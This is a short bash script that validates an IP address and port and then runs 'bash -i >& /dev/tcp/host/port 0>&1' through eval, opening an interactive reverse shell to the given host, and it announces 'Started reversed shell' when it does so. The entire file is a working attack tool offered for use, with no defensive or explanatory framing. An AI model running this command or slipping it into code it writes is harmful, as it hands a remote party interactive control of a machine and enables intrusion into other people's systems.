#!/bin/bash
version="2.0"

green=`tput setaf 2`
red=`tput setaf 1`
reset=`tput sgr0`

arguments_errors=0
if [[ "$1" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    host=$1
else
    echo "${red}[x]${reset}" "Host IP address misconfigured"
    ((arguments_errors++))
fi
if [ "$2" -eq "$2" ] 2>/dev/null; then
    port=$2
else
    echo "${green}[+]${reset}" "Port should be an integer"
    ((arguments_errors++))
fi
if [ $arguments_errors = 0 ]; then
    echo "${green}[+]${reset}" "Started reversed shell (${host}:${port})"
    rs_cmd="bash -i >& /dev/tcp/${host}/${port} 0>&1"
    eval "$rs_cmd"
fi
